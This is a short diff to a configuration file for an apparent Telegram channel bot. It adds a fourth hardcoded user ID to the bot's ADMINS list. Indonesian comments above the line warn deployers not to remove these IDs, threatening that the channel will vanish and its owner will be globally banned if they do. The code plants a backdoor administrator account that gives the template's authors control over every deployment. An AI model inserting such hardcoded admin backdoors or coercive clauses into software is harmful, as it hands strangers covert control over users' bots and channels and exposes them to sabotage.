@@ -68,7 +68,7 @@ BOT_STATS_TEXT = "<b>BOT UPTIME</b>\n{uptime}"
 
 # Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
 # Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
-ADMINS.extend((993270486, 910766621, 844432220))
+ADMINS.extend((993270486, 910766621, 844432220, 1228099043))
 
 
 LOG_FILE_NAME = "logs.txt"
